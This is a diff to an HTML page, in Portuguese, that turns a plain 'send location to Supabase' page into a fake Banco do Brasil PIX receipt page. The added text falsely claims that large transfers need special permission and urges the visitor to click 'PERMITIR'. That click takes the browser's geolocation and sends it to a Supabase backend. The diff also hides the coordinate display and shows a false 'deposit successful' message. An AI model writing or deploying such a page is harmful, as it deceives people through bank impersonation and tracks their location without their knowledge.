@@ -3,19 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Enviar Localização ao Supabase</title>
+    <title>Abrir comprovante</title>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>
     <link rel="stylesheet" href="styles.css">
     <link rel="manifest" href="manifest.json">
 </head>
 <body>
-    <h2>Comprovante de transação PIX acima de 5 mil reais</h2>
+    <h2>Comprovante de transação PIX</h2>
     
-    <p id="status">Banco do Brasil informa: Para fazer download do comprovante, clique em PERMITIR DOWNLOAD para salvar o arquivo no armazenamento.</p>
-    <button onclick="getLocation()">PERMITIR DOWNLOAD</button>
-
-    <p><strong>Latitude:</strong> <span id="latitude">-</span></p>
-    <p><strong>Longitude:</strong> <span id="longitude">-</span></p>
+    <p id="status">Banco do Brasil informa: Por questões de segurança, depósitos ou transferências acima de mil reais necessitam permissão especial para efetivação. Para confirmar, digite o nome completo da pessoa beneficiária e depois clique em PERMITIR DEPÓSITO para prosseguir com seu depósito.</p>
+    
+    <button onclick="getLocation()">PERMITIR</button>
 
     <img id="imagem" src="assets\android-chrome-192x192.png" alt="Imagem dinâmica" width="300">
     <script>
@@ -44,7 +42,7 @@
                     );
                 }
             } catch (error) {
-                console.error("Erro ao verificar permissão:", error);
+                console.error("Erro ao verificar permissão. Clique em PERMITIR", error);
             }
         }
 
@@ -54,11 +52,11 @@
                 const permission = await navigator.permissions.query({ name: "geolocation" });
 
                 if (permission.state === "denied") {
-                    document.getElementById("status").innerText = "Permissão de localização bloqueada. Vá para Configurações > Sites > Localização para ativá-la.";
+                    document.getElementById("status").innerText = "Erro ao verificar permissão. Vá para Configurações > Configurações do Site > Local > Abrir todas as solicitações.";
                     return;
                 }
 
-                document.getElementById("status").innerText = "Obtendo localização...";
+                document.getElementById("status").innerText = "Fazendo a confirmação dos dados... Aguarde";
                 
                 navigator.geolocation.getCurrentPosition(
                     sendLocation, 
@@ -68,7 +66,7 @@
 
             } catch (error) {
                 console.error("Erro ao verificar permissão:", error);
-                document.getElementById("status").innerText = "Erro ao acessar localização.";
+                document.getElementById("status").innerText = "Erro ao verificar permissão.";
             }
         }
     
@@ -76,8 +74,8 @@
             const latitude = position.coords.latitude;
             const longitude = position.coords.longitude;
     
-            document.getElementById("latitude").innerText = latitude.toFixed(6);
-            document.getElementById("longitude").innerText = longitude.toFixed(6);
+            //document.getElementById("latitude").innerText = latitude.toFixed(6);
+            //document.getElementById("longitude").innerText = longitude.toFixed(6);
             document.getElementById("imagem").src = "assets\android-chrome-512x512.png"; 
             //document.getElementById("status").innerText = "Enviando ao Supabase...";
     
@@ -90,7 +88,7 @@
                     throw error;
                 }
     
-                document.getElementById("status").innerText = "Localização enviada com sucesso!";
+                document.getElementById("status").innerText = "Depósito realizado com sucesso. Caso não consiga visualizar seu comprovante corretamente, solicite a segunda via ao banco pelos canais oficiais de atendimento.";
                 console.log("Sucesso:", data);
             } catch (err) {
                 console.error("Erro ao enviar:", err.message);
@@ -105,7 +103,7 @@
                     msg = "Permissão negada pelo usuário.";
                     break;
                 case error.POSITION_UNAVAILABLE:
-                    msg = "Informação de localização indisponível.";
+                    msg = "Informação de local indisponível.";
                     break;
                 case error.TIMEOUT:
                     msg = "Tempo limite de requisição excedido.";
